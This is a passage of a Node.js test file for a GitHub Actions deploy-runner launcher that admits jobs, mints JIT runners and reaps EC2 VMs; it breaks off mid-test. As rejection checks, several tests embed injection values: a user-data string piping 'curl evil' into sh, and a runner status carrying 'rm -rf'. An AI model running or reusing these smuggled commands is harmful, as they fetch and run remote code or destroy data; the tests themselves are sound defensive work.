// node --test infra/deploy-runner/lambda/  (not shipped in the Lambda zip)
// Pure decisions of the deploy runner launcher (ADR-0028, design R10), over
// recorded and documented GitHub payloads in fixtures/.
import { test } from "node:test";
import assert from "node:assert/strict";
import { generateKeyPairSync, createVerify } from "node:crypto";
import { readFileSync } from "node:fs";
import {
  admit,
  appJwt,
  blindRecord,
  BOOT_GRACE_MS,
  classifyRunners,
  completedSince,
  config,
  decide,
  groupOk,
  holdRecord,
  jitRequest,
  launchParams,
  mintedRunnerIds,
  postHocRuns,
  provenance,
  retireList,
  selfcheck,
  servedByDeploy,
  servedRefused,
  staleInstances,
  targetsDeploy,
  tokenRequest,
  toLaunch,
  trusted,
  tripwire,
  unknownRunner,
  userData,
  HARD_CAP_MS,
  IDLE_AFTER_MS,
  REASONS,
} from "./deploy-plan.mjs";

const fixture = (name) =>
  JSON.parse(readFileSync(new URL(`./fixtures/${name}`, import.meta.url), "utf8"));
const REPO = "Conductia/Conductia";
const WANTED = { name: "conductia-deploy", repository: REPO };
const DEFAULT_LABELS = ["conductia-deploy", "self-hosted", "Linux", "X64"];
const TEMPLATE = "lt-0123456789abcdef0";

// The allowlist exactly as variables.tf ships it, so these tests pin the real
// default, not a copy.
const variablesTf = readFileSync(new URL("../variables.tf", import.meta.url), "utf8");
const ALLOWLIST = [
  ...variablesTf.matchAll(
    /\{ workflow = "([^"]+)", branch = "([^"]+)", events = \[([^\]]*)\](?:, expires = "([^"]+)")? \}/g,
  ),
].map(([, workflow, branch, events, expires]) => ({
  workflow,
  branch,
  events: [...events.matchAll(/"([^"]+)"/g)].map((m) => m[1]),
  ...(expires ? { expires } : {}),
}));

const promoteRun = fixture("run-promote-develop-to-staging.json");
const migratePush = fixture("run-migrate-push-develop.json");
const run = (over = {}) => ({ ...promoteRun, ...over });
const NOW = new Date("2026-10-22T12:00:00Z");

test("the allowlist parsed from variables.tf has the five steady-state and three bootstrap rows", () => {
  assert.equal(ALLOWLIST.length, 8);
  assert.equal(ALLOWLIST.filter((e) => !e.expires).length, 5);
  assert.deepEqual(
    ALLOWLIST.filter((e) => e.expires).map((e) => [e.workflow, e.branch, e.expires]),
    [
      [".github/workflows/migrate.yml", "develop", "2026-10-25T23:59:59Z"],
      [".github/workflows/promote-develop-to-staging.yml", "develop", "2026-10-27T23:59:59Z"],
      [".github/workflows/promote-staging-to-main.yml", "staging", "2026-10-30T23:59:59Z"],
    ],
  );
});

// groupOk ------------------------------------------------------------------------------------

const groups = fixture("runner-groups.json").runner_groups;
const repositories = fixture("runner-group-repositories.json").repositories;
const deployGroup = groups.find((g) => g.name === "conductia-deploy");
const facts = (over = {}, repos = repositories) => ({
  groups: [groups[0], { ...deployGroup, ...over }],
  repositories: repos,
});

test("groupOk: the one selected group with this repository alone resolves to its id", () => {
  assert.deepEqual(groupOk({ groups, repositories }, WANTED), { ok: true, id: 7 });
});

test("groupOk: every other shape mints nothing", () => {
  const refused = {
    "missing group": { groups: [groups[0]], repositories: null },
    "duplicate name": { groups: [...groups, { ...deployGroup, id: 8 }], repositories },
    "visibility all": facts({ visibility: "all" }),
    "public repositories allowed": facts({ allows_public_repositories: true }),
    "allows_public_repositories absent": facts({ allows_public_repositories: undefined }),
    "an extra repository": facts({}, [...repositories, { full_name: "Conductia/other" }]),
    "another repository": facts({}, [{ full_name: "Conductia/other" }]),
    "no repository list": facts({}, null),
  };
  for (const [name, f] of Object.entries(refused)) assert.deepEqual(groupOk(f, WANTED), { ok: false }, name);
  assert.deepEqual(groupOk({ groups, repositories }, { ...WANTED, name: "" }), { ok: false }, "empty name: repo mode is not built");
  assert.deepEqual(groupOk({ groups, repositories }, { ...WANTED, name: "Conductia-Deploy" }), { ok: false }, "the name matches exactly");
});

// targetsDeploy ------------------------------------------------------------------------------

test("targetsDeploy: a job targets the deploy runner when its labels are a subset of the runner's", () => {
  assert.equal(targetsDeploy({ labels: [] }, DEFAULT_LABELS), true, "group-only job");
  assert.equal(targetsDeploy({ labels: ["conductia-deploy"] }, DEFAULT_LABELS), true);
  assert.equal(targetsDeploy({ labels: ["self-hosted"] }, DEFAULT_LABELS), true, "the runner holds the defaults");
  assert.equal(targetsDeploy({ labels: ["self-hosted"] }, ["conductia-deploy"]), false, "the runner lacks the defaults");
  assert.equal(targetsDeploy({ labels: ["ubuntu-latest"] }, DEFAULT_LABELS), false);
  assert.equal(targetsDeploy({ labels: ["conductia-ci-light"] }, DEFAULT_LABELS), false);
  assert.equal(targetsDeploy({ labels: ["conductia-deploy", "conductia-ci-light"] }, DEFAULT_LABELS), false);
});

test("targetsDeploy: matching is case-insensitive", () => {
  assert.equal(targetsDeploy({ labels: ["Conductia-Deploy"] }, DEFAULT_LABELS), true);
  assert.equal(targetsDeploy({ labels: ["SELF-HOSTED", "linux", "x64"] }, DEFAULT_LABELS), true);
});

test("targetsDeploy: the recorded hosted and fleet jobs do not target the deploy runner", () => {
  for (const name of ["jobs-promote-develop-to-staging.json", "jobs-migrate-push-develop.json"])
    for (const job of fixture(name).jobs) assert.equal(targetsDeploy(job, DEFAULT_LABELS), false, `${name} ${job.id}`);
});

// admit ---------------------------------------------------------------------------------------

test("admit: the recorded promotion (dispatched from main) is served by its steady-state row", () => {
  assert.equal(promoteRun.path, ".github/workflows/promote-develop-to-staging.yml", "run.path is a bare path");
  assert.equal(admit(promoteRun, ALLOWLIST, NOW, REPO), "ok");
});

test("admit: a promotion's called migrate job is admitted by the caller's path", () => {
  const [job] = fixture("jobs-promote-queued-migrate.json").jobs;
  assert.equal(job.run_id, promoteRun.id);
  assert.equal(targetsDeploy(job, DEFAULT_LABELS), true);
  assert.equal(admit(promoteRun, ALLOWLIST, NOW, REPO), "ok");
});

test("admit: each refusal has its code", () => {
  assert.equal(admit(run({ head_branch: "canary/deploy-refused" }), ALLOWLIST, NOW, REPO), "not_allowlisted", "wrong branch");
  assert.equal(admit(run({ event: "push" }), ALLOWLIST, NOW, REPO), "not_allowlisted", "wrong event");
  assert.equal(admit(run({ path: ".github/workflows/ci.yml" }), ALLOWLIST, NOW, REPO), "not_allowlisted", "unknown workflow");
  assert.equal(admit(run({ path: ".github/workflows/migrate.yml@refs/heads/main" }), ALLOWLIST, NOW, REPO), "not_allowlisted", "a path with a ref suffix is not a bare path");
  assert.equal(admit(run({ head_repository: { full_name: "someone/Conductia" } }), ALLOWLIST, NOW, REPO), "foreign_repo", "fork head");
  assert.equal(admit(run({ head_repository: null }), ALLOWLIST, NOW, REPO), "foreign_repo", "no head repository");
  assert.equal(admit(migratePush, ALLOWLIST, NOW, REPO), "not_allowlisted", "a recorded push to develop is never served");
  for (const code of ["not_allowlisted", "expired", "provenance", "foreign_repo"]) assert.ok(REASONS.includes(code));
});

test("admit: a bootstrap row is served up to its expiry and refused one second after", () => {
  const canary = run({ path: ".github/workflows/migrate.yml", head_branch: "develop", event: "workflow_dispatch" });
  assert.equal(admit(canary, ALLOWLIST, new Date("2026-10-25T23:59:58Z"), REPO), "ok", "one second before");
  assert.equal(admit(canary, ALLOWLIST, new Date("2026-10-25T23:59:59Z"), REPO), "ok", "at the expiry");
  assert.equal(admit(canary, ALLOWLIST, new Date("2026-10-26T00:00:00Z"), REPO), "expired", "one second after");
  const dryRun = run({ head_branch: "develop" });
  assert.equal(admit(dryRun, ALLOWLIST, new Date("2026-10-27T23:59:58Z"), REPO), "ok");
  assert.equal(admit(dryRun, ALLOWLIST, new Date("2026-10-28T00:00:00Z"), REPO), "expired");
});

test("admit: an unreadable expiry counts as expired", () => {
  const list = [{ workflow: promoteRun.path, branch: "main", events: ["workflow_dispatch"], expires: "soon" }];
  assert.equal(admit(promoteRun, list, NOW, REPO), "expired");
});

// provenance ----------------------------------------------------------------------------------

test("provenance: behind_by 0 passes, anything else fails", () => {
  assert.equal(provenance(fixture("compare-on-branch.json")), "ok");
  assert.equal(fixture("compare-off-branch.json").behind_by > 0, true);
  assert.equal(provenance(fixture("compare-off-branch.json")), "provenance");
  assert.equal(provenance({ behind_by: 1 }), "provenance");
  assert.equal(provenance({ behind_by: "0" }), "provenance");
  assert.equal(provenance(undefined), "provenance");
});

// the hold and toLaunch -----------------------------------------------------------------------

test("the hold: one refused targeting job makes the launch count 0", () => {
  assert.deepEqual(decide(["ok", "ok", "not_allowlisted"], 0, 0, 3), { admitted: 2, refused: 1, held: true, launch: 0, deregister: [] });
  assert.deepEqual(decide(["provenance"], 0, 0, 3), { admitted: 0, refused: 1, held: true, launch: 0, deregister: [] });
  assert.deepEqual(decide(["ok", "ok"], 0, 0, 3), { admitted: 2, refused: 0, held: false, launch: 2, deregister: [] });
  assert.deepEqual(decide([], 0, 0, 3), { admitted: 0, refused: 0, held: false, launch: 0, deregister: [] });
});

test("the hold, audit V1: a blind queued check holds like a refusal, with nothing refused", () => {
  assert.deepEqual(decide(["ok", "ok"], 0, 0, 3, [5001], true), { admitted: 2, refused: 0, held: true, launch: 0, deregister: [5001] });
  assert.deepEqual(decide(["ok"], 0, 0, 3, [5001], false), { admitted: 1, refused: 0, held: false, launch: 1, deregister: [] });
});

test("blindRecord: exactly its keys, a known scope and an error name", () => {
  assert.deepEqual(blindRecord("posthoc", "TooManyPages"), { event: "deploy_blind", scope: "posthoc", error: "TooManyPages" });
  assert.deepEqual(blindRecord("queued", "GitHubError:502"), { event: "deploy_blind", scope: "queued", error: "GitHubError:502" });
  assert.throws(() => blindRecord("other", "x"));
});

test("toLaunch: max(0, min(admitted - idle, cap - live))", () => {
  assert.equal(toLaunch(3, 1, 0), 2);
  assert.equal(toLaunch(5, 0, 0), 3, "the cap");
  assert.equal(toLaunch(2, 0, 2), 1, "the cap counts live VMs, not this tick");
  assert.equal(toLaunch(4, 0, 3), 0);
  assert.equal(toLaunch(1, 2, 0), 0, "idle covers it");
  assert.equal(toLaunch(0, 0, 5), 0, "never negative");
});

// jitRequest -----------------------------------------------------------------------------------

test("jitRequest: the exact body", () => {
  assert.deepEqual(jitRequest(7, "0123456789ab"), {
    name: "deploy-0123456789ab",
    runner_group_id: 7,
    labels: ["conductia-deploy"],
    work_folder: "_work",
  });
  assert.match(jitRequest(7, "ffffffffffff").name, /^deploy-[0-9a-f]{12}$/);
  assert.throws(() => jitRequest(7, "xyz"));
  assert.throws(() => jitRequest(0, "0123456789ab"));
});

// trust and capacity ---------------------------------------------------------------------------

const instance = (id, state, tags) => ({
  InstanceId: id,
  State: { Name: state },
  Tags: Object.entries(tags).map(([Key, Value]) => ({ Key, Value })),
});
const deployTags = (runnerId, template = TEMPLATE) => ({
  Component: "deploy-runner",
  RunnerId: String(runnerId),
  "aws:ec2launchtemplate:id": template,
});

test("trusted: Component, a RunnerId and the deploy template's id, all three", () => {
  assert.equal(trusted(instance("i-1", "running", deployTags(5001)), TEMPLATE), true);
  assert.equal(trusted(instance("i-2", "running", { Component: "deploy-runner" }), TEMPLATE), false, "Component only");
  assert.equal(trusted(instance("i-3", "running", deployTags(5001, "lt-other")), TEMPLATE), false, "another template");
  assert.equal(trusted(instance("i-4", "running", { ...deployTags(5001), Component: "ci-runner" }), TEMPLATE), false);
  assert.equal(trusted(instance("i-5", "running", deployTags("abc")), TEMPLATE), false, "RunnerId is a runner id");
  assert.equal(trusted(instance("i-6", "running", deployTags(5001)), ""), false, "no template id configured");
});

// classifyRunners, unknownRunner (R23) --------------------------------------------------------

const ids = (rs) => rs.map((r) => r.id);

test("classifyRunners: known on a live VM (a booting one included), idle when not busy; live counts trusted pending or running VMs", () => {
  const runners = fixture("group-runners.json").runners; // 5001 offline idle, 5002 busy
  const instances = [
    instance("i-1", "pending", deployTags(5001)), // minted last tick, still booting
    instance("i-2", "running", deployTags(5002)),
    instance("i-3", "terminated", deployTags(5009)),
  ];
  const c = classifyRunners(runners, instances, TEMPLATE);
  assert.deepEqual(ids(c.known), [5001, 5002]);
  assert.deepEqual(ids(c.idle), [5001], "a booting runner is idle capacity, so no second VM is launched for it");
  assert.deepEqual([c.reap, c.unknown], [[], []]);
  assert.equal(c.live, 2);
  assert.equal(toLaunch(1, c.idle.length, c.live, 3), 0);
});

test("classifyRunners: a runner whose VM is no longer live is reaped; a runner on no VM is unknown", () => {
  const runners = [
    { id: 5001, status: "offline", busy: false },
    { id: 5002, status: "online", busy: false },
    { id: 5003, status: "offline", busy: false },
    { id: 5004, status: "online", busy: true },
  ];
  const instances = [
    instance("i-1", "terminated", deployTags(5001)),
    instance("i-2", "shutting-down", deployTags(5002)),
    instance("i-3", "stopped", deployTags(5003)), // only someone else stops a deploy VM
  ];
  const c = classifyRunners(runners, instances, TEMPLATE);
  assert.deepEqual(ids(c.reap), [5001, 5002, 5003]);
  assert.deepEqual(ids(c.unknown), [5004]);
  assert.deepEqual([c.known, c.idle, c.live], [[], [], 0]);
});

test("classifyRunners: the recorded fleet runners in a group listing are all unknown", () => {
  const recorded = fixture("runners-recorded-fleet.json").runners;
  assert.equal(recorded.length, 6);
  const c = classifyRunners(recorded, [instance("i-1", "running", deployTags(5001))], TEMPLATE);
  assert.deepEqual(ids(c.unknown), ids(recorded));
  assert.deepEqual(c.unknown.map(unknownRunner)[0], { event: "deploy_unknown_runner", runner_id: 23, status: "online", busy: true });
});

test("classifyRunners, round 2 #9: an untrusted instance is never classified or counted, even if it names a runner", () => {
  const runners = fixture("group-runners.json").runners;
  const forged = [
    instance("i-7", "running", { Component: "deploy-runner", RunnerId: "5001" }),
    instance("i-8", "running", deployTags(5002, "lt-other")),
    instance("i-9", "terminated", { Component: "deploy-runner", RunnerId: "5001" }),
  ];
  const c = classifyRunners(runners, forged, TEMPLATE);
  assert.deepEqual([ids(c.known), ids(c.idle), ids(c.reap), c.live], [[], [], [], 0]);
  assert.deepEqual(ids(c.unknown), [5001, 5002], "a runner on a forged VM is one the launcher never minted");
  assert.equal(toLaunch(1, c.idle.length, c.live, 3), 1);
  assert.equal(classifyRunners(runners, [instance("i-1", "running", deployTags(5001))], "").unknown.length, 2, "no template id, nothing trusted");
});

test("unknownRunner: exactly event, runner_id, status and busy; never a name", () => {
  const r = { id: 77, name: "steal-secrets", os: "Linux", status: "online", busy: false, labels: [{ name: "conductia-deploy" }] };
  assert.deepEqual(unknownRunner(r), { event: "deploy_unknown_runner", runner_id: 77, status: "online", busy: false });
  assert.deepEqual(Object.keys(unknownRunner(r)), ["event", "runner_id", "status", "busy"]);
  assert.deepEqual(unknownRunner({ id: 78, status: "online; rm -rf", busy: "yes" }), { event: "deploy_unknown_runner", runner_id: 78, status: "offline", busy: false });
  assert.doesNotMatch(JSON.stringify(unknownRunner(r)), /steal|Linux/);
});

// staleInstances, retireList (R26, round 2 #1, #4, #9) ----------------------------------------

const STALE_NOW = new Date("2026-10-22T12:00:00Z");
const ago = (minutes) => new Date(STALE_NOW.getTime() - minutes * 60_000);
const vm = (id, runnerId, minutes, state = "running", template = TEMPLATE) => ({
  ...instance(id, state, deployTags(runnerId, template)),
  LaunchTime: ago(minutes),
});
const online = (id, busy = false) => ({ id, status: "online", busy });

test("staleInstances: an online idle runner 6 minutes after a 2-minute boot (VM 8 minutes old) is a candidate; one idle 4 minutes (VM 6 minutes old) is not", () => {
  assert.equal(IDLE_AFTER_MS, 7 * 60_000);
  assert.deepEqual(staleInstances([vm("i-1", 5001, 8)], [online(5001)], STALE_NOW, 3, TEMPLATE), {
    deleteFirst: [{ instanceId: "i-1", runnerId: 5001 }],
    hardCap: [],
  });
  assert.deepEqual(staleInstances([vm("i-1", 5001, 6)], [online(5001)], STALE_NOW, 3, TEMPLATE), { deleteFirst: [], hardCap: [] });
  assert.deepEqual(staleInstances([vm("i-1", 5001, 7)], [online(5001)], STALE_NOW, 3, TEMPLATE).deleteFirst, [], "7 minutes exactly is not yet stale");
});

test("staleInstances: a busy runner, an offline (booting) one and a VM with no listed runner are not idle candidates", () => {
  const instances = [vm("i-1", 5001, 40), vm("i-2", 5002, 9), vm("i-3", 5003, 40)];
  const runners = [online(5001, true), { id: 5002, status: "offline", busy: false }];
  assert.deepEqual(staleInstances(instances, runners, STALE_NOW, 3, TEMPLATE), { deleteFirst: [], hardCap: [] });
});

test("audit V6: a runner never online on a VM older than 10 minutes is stuck: not idle capacity, and retired delete first", () => {
  assert.equal(BOOT_GRACE_MS, 10 * 60_000);
  const offline = (id) => ({ id, status: "offline", busy: false });
  const instances = [vm("i-1", 5001, 11), vm("i-2", 5002, 10), vm("i-3", 5003, 40)];
  const runners = [offline(5001), offline(5002), { id: 5003, status: "offline", busy: true }];
  assert.deepEqual(staleInstances(instances, runners, STALE_NOW, 3, TEMPLATE).deleteFirst, [{ instanceId: "i-1", runnerId: 5001 }], "10 minutes exactly is still booting; a busy one is never stuck");
  const c = classifyRunners(runners, instances, TEMPLATE, STALE_NOW);
  assert.deepEqual(ids(c.idle), [5002], "the stuck runner is not idle capacity");
  assert.deepEqual(ids(c.known), [5001, 5002, 5003]);
  assert.deepEqual(ids(classifyRunners(runners, instances, TEMPLATE).idle), [5001, 5002], "without the time, nothing is judged stuck");
});

test("staleInstances: past 130 minutes a VM is terminated whatever its state, busy or not, without the delete", () => {
  assert.equal(HARD_CAP_MS, 130 * 60_000);
  const instances = [
    vm("i-1", 5001, 131),
    vm("i-2", 5002, 131, "pending"),
    vm("i-3", 5003, 131, "stopped"),
    vm("i-4", 5004, 131, "terminated"),
    vm("i-5", 5005, 131, "shutting-down"),
    vm("i-6", 5006, 129),
  ];
  const runners = [online(5001, true), online(5002), online(5006, true)];
  assert.deepEqual(staleInstances(instances, runners, STALE_NOW, 3, TEMPLATE), {
    deleteFirst: [],
    hardCap: [
      { instanceId: "i-1", runnerId: 5001 },
      { instanceId: "i-2", runnerId: 5002 },
      { instanceId: "i-3", runnerId: 5003 },
    ],
  });
});

test("staleInstances: over the cap, the newest VMs with an idle runner go first, enough to come back to the cap", () => {
  const instances = [vm("i-1", 5001, 5), vm("i-2", 5002, 4), vm("i-3", 5003, 3), vm("i-4", 5004, 2), vm("i-5", 5005, 1)];
  const runners = [online(5001), online(5002), { id: 5003, status: "offline", busy: false }, online(5004), online(5005, true)];
  // Five live, cap 3: two over. i-5 is newest but busy; i-4 and i-3 are the newest idle.
  assert.deepEqual(staleInstances(instances, runners, STALE_NOW, 3, TEMPLATE).deleteFirst, [
    { instanceId: "i-4", runnerId: 5004 },
    { instanceId: "i-3", runnerId: 5003 },
  ]);
  assert.deepEqual(staleInstances(instances.slice(0, 3), runners, STALE_NOW, 3, TEMPLATE).deleteFirst, [], "at the cap, nothing");
  // An idle-stale VM already counts toward coming back to the cap; no VM is listed twice.
  const mixed = [vm("i-1", 5001, 20), vm("i-2", 5002, 2), vm("i-3", 5003, 1), vm("i-4", 5004, 3)];
  const runners4 = [online(5001), online(5002), online(5003), online(5004, true)];
  assert.deepEqual(staleInstances(mixed, runners4, STALE_NOW, 3, TEMPLATE).deleteFirst.map((c) => c.instanceId), ["i-1"]);
  assert.deepEqual(staleInstances(mixed, runners4, STALE_NOW, 2, TEMPLATE).deleteFirst.map((c) => c.instanceId), ["i-1", "i-3"]);
});

test("staleInstances, round 2 #9: an untrusted VM is never a candidate, however old or idle; nor is one whose launch time is unreadable", () => {
  const instances = [
    { ...instance("i-1", "running", { Component: "deploy-runner", RunnerId: "5001" }), LaunchTime: ago(200) },
    vm("i-2", 5002, 200, "running", "lt-other"),
    { ...instance("i-3", "running", deployTags(5003)), LaunchTime: undefined },
  ];
  const runners = [online(5001), online(5002), online(5003)];
  assert.deepEqual(staleInstances(instances, runners, STALE_NOW, 0, TEMPLATE), { deleteFirst: [], hardCap: [] });
});

test("retireList: the stale candidates plus, while held, every idle minted runner's VM; once per VM; never a hard-capped one", () => {
  const instances = [vm("i-1", 5001, 8), vm("i-2", 5002, 2), vm("i-3", 5003, 140), vm("i-4", 5004, 2, "running", "lt-other")];
  const stale = staleInstances(instances, [online(5001), online(5002), online(5003)], STALE_NOW, 3, TEMPLATE);
  assert.deepEqual(retireList(stale, [], instances, TEMPLATE), [{ instanceId: "i-1", runnerId: 5001 }], "not held");
  assert.deepEqual(retireList(stale, [5001, 5002, 5003, 5004], instances, TEMPLATE), [
    { instanceId: "i-1", runnerId: 5001 },
    { instanceId: "i-2", runnerId: 5002 },
  ], "held: the purge adds the young idle runner; the hard-capped and the untrusted VMs are not in it");
});

// token, JWT, user data, launch ---------------------------------------------------------------

test("tokenRequest: this repository only, group-mode permissions, never Administration", () => {
  assert.deepEqual(tokenRequest(REPO), {
    repositories: ["Conductia"],
    permissions: {
      actions: "read",
      contents: "read",
      metadata: "read",
      organization_self_hosted_runners: "write",
    },
  });
  assert.doesNotMatch(JSON.stringify(tokenRequest(REPO)), /administration/i);
});

test("appJwt: RS256, issued 60 s back, expires within 10 minutes, verifies with the App's public key", () => {
  const { privateKey, publicKey } = generateKeyPairSync("rsa", { modulusLength: 2048 });
  const pem = privateKey.export({ type: "pkcs1", format: "pem" });
  const now = Date.parse("2026-10-22T12:00:00Z");
  const jwt = appJwt("123456", pem, now);
  const [head, body, sig] = jwt.split(".");
  const decode = (s) => JSON.parse(Buffer.from(s, "base64url").toString("utf8"));
  assert.deepEqual(decode(head), { alg: "RS256", typ: "JWT" });
  const claims = decode(body);
  assert.equal(claims.iss, 123456);
  assert.equal(claims.iat, now / 1000 - 60);
  assert.ok(claims.exp - now / 1000 <= 600 && claims.exp > now / 1000);
  const v = createVerify("RSA-SHA256");
  v.update(`${head}.${body}`);
  assert.equal(v.verify(publicKey, Buffer.from(sig, "base64url")), true);
  assert.throws(() => appJwt("", pem, now));
});

test("userData: the JIT config replaces the placeholder once; nothing but base64 goes in", () => {
  const script = "#!/bin/bash\nshutdown -h +120\njit='__JIT_CONFIG__'\n";
  const { encoded_jit_config } = fixture("generate-jitconfig.json");
  const out = Buffer.from(userData(script, encoded_jit_config), "base64").toString("utf8");
  assert.equal(out, `#!/bin/bash\nshutdown -h +120\njit='${encoded_jit_config}'\n`);
  assert.throws(() => userData(script, "abc'; curl evil | sh; '"));
  assert.throws(() => userData(script, ""));
  assert.throws(() => userData("#!/bin/bash\n", encoded_jit_config), /placeholder/);
  assert.throws(() => userData(`${script}${script}`, encoded_jit_config), /placeholder/);
});

test("launchParams: the template by id at the pinned version, every created resource tagged", () => {
  const p = launchParams({ templateId: TEMPLATE, version: 4, userData: "Zm9v", runnerId: 5003 });
  assert.deepEqual(p.LaunchTemplate, { LaunchTemplateId: TEMPLATE, Version: "4" });
  assert.equal(p.MinCount, 1);
  assert.equal(p.MaxCount, 1);
  assert.equal(p.UserData, "Zm9v");
  assert.equal(p.DryRun, undefined);
  assert.deepEqual(p.TagSpecifications.map((t) => t.ResourceType), ["instance", "volume", "network-interface"]);
  for (const t of p.TagSpecifications) {
    assert.ok(t.Tags.some((x) => x.Key === "Component" && x.Value === "deploy-runner"));
    assert.ok(t.Tags.some((x) => x.Key === "RunnerId" && x.Value === "5003"));
  }
  for (const version of ["$Latest", "$Default", "", undefined])
    assert.throws(() => launchParams({ templateId: TEMPLATE, version, runnerId: 1 }), String(version));
  assert.equal(launchParams({ templateId: TEMPLATE, version: "4", runnerId: 0, dryRun: true }).DryRun, true);
});

test("selfcheck: DryRunOperation is authorized, UnauthorizedOperation denied, anything else an error", () => {
  assert.deepEqual(selfcheck("DryRunOperation"), { event: "deploy_selfcheck", run_instances: "authorized" });
  assert.deepEqual(selfcheck("UnauthorizedOperation"), { event: "deploy_selfcheck", run_instances: "denied" });
  assert.deepEqual(selfcheck("ThrottlingException"), { event: "deploy_selfcheck", run_instances: "error" });
});

test("config: the Lambda environment parses, and a missing value fails before any call", () => {
  const env = {
    REPO,
    GITHUB_APP_ID: "123",
    GITHUB_APP_INSTALLATION_ID: "456",
    APP_KEY_PARAM: "/conductia/deploy-runner/github-app-key",
    GROUP_NAME: "conductia-deploy",
    RUNNER_LABELS: DEFAULT_LABELS.join(","),
    ALLOWLIST: JSON.stringify(ALLOWLIST),
    TEMPLATE_ID: TEMPLATE,
    LAUNCH_TEMPLATE_VERSION: "4",
    CAP: "3",
  };
  const cfg = config(env);
  assert.equal(cfg.org, "Conductia");
  assert.deepEqual(cfg.runnerLabels, DEFAULT_LABELS);
  assert.equal(cfg.allowlist.length, 8);
  assert.equal(cfg.cap, 3);
  for (const k of ["REPO", "GITHUB_APP_ID", "ALLOWLIST", "TEMPLATE_ID", "LAUNCH_TEMPLATE_VERSION"])
    assert.throws(() => config({ ...env, [k]: "" }), new RegExp(k));
});

// tripwire, hold and the post-hoc check (Phase 3, design R17, R25) -----------------------------

const prRun = fixture("run-ci-pull-request-attempt-2.json");
const prJobs = fixture("jobs-ci-pull-request-attempt-2-served.json").jobs;
const SERVED = prJobs.find((j) => j.runner_group_id === 7);

test("tripwire: exactly its keys, for all six reasons; ids and a code only", () => {
  assert.equal(REASONS.length, 6);
  const job = { id: 22, labels: ["conductia-deploy"], name: "steal secrets", head_branch: "evil" };
  const r = { ...prRun, id: 11 };
  for (const reason of ["not_allowlisted", "expired", "provenance", "foreign_repo"])
    assert.deepEqual(tripwire(r, job, reason), { event: "deploy_tripwire", run_id: 11, job_id: 22, reason }, reason);
  assert.deepEqual(tripwire(r, job, "served_refused", 5004), {
    event: "deploy_tripwire",
    run_id: 11,
    job_id: 22,
    reason: "served_refused",
    runner_id: 5004,
  });
  assert.deepEqual(tripwire(null, null, "group_misconfigured"), { event: "deploy_tripwire", reason: "group_misconfigured" });
  assert.deepEqual(tripwire(r, job, "group_misconfigured"), { event: "deploy_tripwire", reason: "group_misconfigured" }, "no ids, even if given");
  for (const reason of REASONS)
    assert.doesNotMatch(JSON.stringify(tripwire(r, job, reason, 5004)), /feat\/639|evil|steal|ci\.yml|CI"/, reason);
  assert.throws(() => tripwire(r, job, "because"), /unknown reason/);
});

test("holdRecord: exactly its keys", () => {
  assert.deepEqual(holdRecord(1, 2), { event: "deploy_hold", refused: 1, admitted_waiting: 2 });
  assert.deepEqual(Object.keys(holdRecord(3, 0)), ["event", "refused", "admitted_waiting"]);
});

test("the hold lists every idle minted runner for deregistration, and only while held", () => {
  const runners = fixture("group-runners.json").runners; // 5001 offline idle, 5002 busy
  const instances = [
    instance("i-1", "pending", deployTags(5001)),
    instance("i-2", "running", deployTags(5002)),
    instance("i-3", "running", { Component: "deploy-runner", RunnerId: "5003" }), // untrusted
  ];
  const c = classifyRunners([...runners, { id: 5003, busy: false }], instances, TEMPLATE);
  const idleIds = ids(c.idle);
  assert.deepEqual(idleIds, [5001], "busy and untrusted runners are never purged");
  assert.deepEqual(decide(["ok", "expired"], c.idle.length, c.live, 3, idleIds), { admitted: 1, refused: 1, held: true, launch: 0, deregister: [5001] });
  assert.deepEqual(decide(["ok"], c.idle.length, c.live, 3, idleIds).deregister, [], "no refusal, no purge");
});

test("completedSince: created >= now - 130 minutes, to the second", () => {
  assert.equal(completedSince(new Date("2026-10-21T18:21:00.123Z")), ">=2026-10-21T16:11:00Z");
});

test("postHocRuns: only completed runs updated in the last 5 minutes are re-read", () => {
  const at = (iso) => ({ ...prRun, updated_at: iso });
  const now = new Date("2026-10-21T18:21:00Z");
  assert.deepEqual(postHocRuns([prRun], now), [prRun], "updated 1m47s ago");
  assert.deepEqual(postHocRuns([at("2026-10-21T18:16:00Z")], now).length, 1, "exactly 5 minutes");
  assert.deepEqual(postHocRuns([at("2026-10-21T18:15:59Z")], now), [], "5 minutes and 1 second");
  assert.deepEqual(postHocRuns([prRun], new Date("2026-10-21T18:25:00Z")), [], "the recorded run, 5m47s later");
  assert.equal(postHocRuns([at(undefined)], now).length, 1, "an unreadable updated_at is re-read");
});

test("servedByDeploy: the group id or a minted runner id; nothing else", () => {
  const none = new Set();
  assert.equal(servedByDeploy(SERVED, 7, none), true, "group id alone, after the instance aged out");
  assert.equal(servedByDeploy({ ...SERVED, runner_group_id: 1 }, 7, new Set(["5004"])), true, "minted id alone");
  assert.equal(servedByDeploy({ ...SERVED, runner_group_id: 1 }, 7, none), false);
  for (const job of prJobs.filter((j) => j !== SERVED)) assert.equal(servedByDeploy(job, 7, new Set(["5004"])), false, String(job.id));
  assert.equal(servedByDeploy({ runner_id: null, runner_group_id: null }, 7, new Set(["null"])), false);
});

test("mintedRunnerIds: every trusted instance in any state, never a forged one", () => {
  const instances = [
    instance("i-1", "running", deployTags(5001)),
    instance("i-2", "terminated", deployTags(5004)),
    instance("i-3", "running", deployTags(5005, "lt-other")),
    instance("i-4", "running", { Component: "deploy-runner", RunnerId: "5006" }),
  ];
  assert.deepEqual([...mintedRunnerIds(instances, TEMPLATE)].sort(), ["5001", "5004"]);
});

test("servedRefused: one record for a refused run's job on a deploy runner, none for an admitted run", () => {
  const entries = prJobs.map((job) => ({ run: prRun, job }));
  const refused = (run) => admit(run, ALLOWLIST, NOW, REPO);
  assert.equal(refused(prRun), "not_allowlisted");
  assert.deepEqual(servedRefused(entries, 7, new Set(), refused), [
    { event: "deploy_tripwire", run_id: prRun.id, job_id: SERVED.id, reason: "served_refused", runner_id: 5004 },
  ]);
  assert.deepEqual(servedRefused(entries, 7, new Set(), () => "ok"), [], "an admitted run");
  assert.equal(servedRefused(entries, 7, new Set(), () => undefined).length, 1, "no verdict counts as refused");
  assert.deepEqual(servedRefused(entries, 8, new Set(), refused), [], "another group's id");
});

test("servedRefused: the attempt-2 job that started and ended between ticks is caught from the completed run", () => {
  // The run completed; its updated_at is inside the window; filter=all holds both attempts.
  const now = new Date("2026-10-21T18:21:00Z");
  const [run] = postHocRuns([prRun], now);
  assert.equal(run.run_attempt, 2);
  assert.deepEqual(new Set(prJobs.map((j) => j.run_attempt)), new Set([1, 2]), "filter=all: every attempt");
  const records = servedRefused(prJobs.map((job) => ({ run, job })), 7, new Set(), (r) => admit(r, ALLOWLIST, now, REPO));
  assert.equal(records.length, 1);
